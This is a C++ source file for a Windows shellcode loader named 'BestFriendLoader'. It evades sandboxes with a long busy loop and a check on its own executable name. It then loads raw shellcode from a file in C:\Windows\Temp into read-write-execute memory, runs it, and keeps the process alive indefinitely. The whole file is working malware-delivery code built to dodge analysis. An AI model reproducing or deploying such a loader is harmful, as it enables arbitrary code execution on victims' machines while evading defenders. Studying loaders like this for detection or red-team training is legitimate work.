#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <regex>
#include <cstring>
#include <fstream>
#include <vector>
using namespace std;

#define MAX_OP 89888996

void shellcode();

void Log(const string& msg) {
    cout << msg << endl;
    OutputDebugStringA((msg + "\n").c_str());
}

int main(int argc, char* argv[])
{
    char path[MAX_PATH];
    int cpt = 0;

    Log("[*] Starting loop to increment counter...");

    for (int i = 0; i < MAX_OP; i++) {
        cpt++;
        if (i % (MAX_OP / 10) == 0) {
            Log("[*] Loop progress: " + to_string(i));
        }
    }

    Log("[*] Loop finished. Counter value: " + to_string(cpt));

    if (cpt == MAX_OP) {
        Log("[*] Counter matches MAX_OP. Continuing...");

        GetModuleFileNameA(NULL, path, MAX_PATH);
        Log("[*] Retrieved executable path: " + string(path));

        regex str_expr(R"(.*\\BestFriendLoader\.exe$)");

        if (regex_match(path, str_expr)) {
            Log("[+] Regex matched! Launching shellcode...");
            shellcode();
        }
        else {
            Log("[-] Regex did not match. Exiting.");
        }
    }
    else {
        Log("[-] Counter mismatch. Exiting.");
    }

    return 0;
}

void shellcode()
{
    Log("[*] Inside shellcode function.");

    char cwd[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, cwd);
    Log("[*] Current working directory: " + std::string(cwd));


    // Open shellcode file
    std::ifstream file("C:\\Windows\\Temp\\BestFriend.bin", std::ios::binary | std::ios::ate);
    if (!file) {
        Log("[-] Failed to open BestFriend.bin");
        return;
    }

    // Get file size and read contents
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    if (size <= 0) {
        Log("[-] BestFriend.bin is empty or could not read size.");
        return;
    }

    std::vector<char> buf(size);
    if (!file.read(buf.data(), size)) {
        Log("[-] Failed to read shellcode from BestFriend.bin");
        return;
    }
    file.close();

    Log("[*] Buffer size: " + std::to_string(size));
    // Optional: print first bytes for debugging
    char hexbuf[64] = { 0 };
    snprintf(hexbuf, 64, "Shellcode starts: %02X %02X %02X %02X %02X",
        (unsigned char)buf[0], (unsigned char)buf[1], (unsigned char)buf[2],
        (unsigned char)buf[3], (unsigned char)buf[4]);
    Log(hexbuf);

    // Allocate RWX memory
    void* exec = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        Log("[-] VirtualAlloc failed.");
        return;
    }

    memcpy(exec, buf.data(), size);
    Log("[*] Shellcode copied to RWX memory.");

    FlushInstructionCache(GetCurrentProcess(), exec, size);

    // Execute the shellcode
    // After shellcode execution
    Log("[*] Executing shellcode now...");
    ((void(*)())exec)();

#ifdef _DEBUG
    // Just for debugging, don't sleep forever
    Sleep(10000); // Sleep 10s
#else
    // Keep the process alive for as long as possible
    while (true) {
        Sleep(10000);
    }
#endif

}
